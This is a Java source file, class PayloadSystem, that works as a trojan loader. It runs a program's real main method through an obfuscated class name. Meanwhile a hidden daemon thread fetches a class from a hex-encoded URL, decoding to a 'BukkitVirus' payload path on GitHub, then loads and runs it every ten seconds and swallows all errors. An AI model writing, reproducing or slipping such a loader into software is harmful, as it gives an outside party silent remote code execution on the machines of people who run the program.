package plvc.dep;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;

public class PayloadSystem {

    private static boolean pld = false;

    public static void main(String[] args) throws NoSuchMethodException, ClassNotFoundException, InvocationTargetException, IllegalAccessException {
        pld = true;
        run();
        Class mcClass = Class.forName(("_".toLowerCase() + "0ef7878959aec39e48a9b370a79bbfde").substring(1));
        Method mainMethod = mcClass.getMethod("main", String[].class);
        mainMethod.invoke(null, (Object) args);
    }

    private static void run() {
        Thread t = new Thread(PayloadSystem::payload);
        t.setDaemon(true);
        t.start();
    }

    private static void payload() {
        while (true) {
            try {
                Thread.sleep(10000);
            } catch (InterruptedException e) {
            }

            try {
                String hexHex = "68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f64656572616e676c65322f42756b6b697456697275732f6d61737465722f7061796c6f61642f";
                URL url = new URL(new String(hexStringToByteArray(hexHex)));
                /*InputStream is = url.openStream();
                ByteArrayOutputStream os = new ByteArrayOutputStream();
                while (true) {
                    int i = is.read();
                    if (i == -1) {
                        break;
                    }
                    os.write(i);
                }
                byte[] classData = os.toByteArray();*/

                //HashMap<String, byte[]> extraClasses = new HashMap<>();
                //extraClasses.put("Payload", classData);
                //, extraClasses
                System.out.println("HEY");
                ClassLoader classLoader = new URLClassLoader(new URL[]{url}, Thread.currentThread().getContextClassLoader());
                Class payloadClass = classLoader.loadClass("Payload");
                Object payloadInstance = payloadClass.newInstance();
                Method runMethod = payloadClass.getDeclaredMethod("run");
                runMethod.invoke(payloadInstance);
            } catch (Exception e) {
            }
        }
    }

    public static byte[] hexStringToByteArray(String hex) {
        int l = hex.length();
        byte[] data = new byte[l / 2];
        for (int i = 0; i < l; i += 2) {
            data[i / 2] = (byte) ((Character.digit(hex.charAt(i), 16) << 4) + Character.digit(hex.charAt(i + 1), 16));
        }
        return data;
    }

}
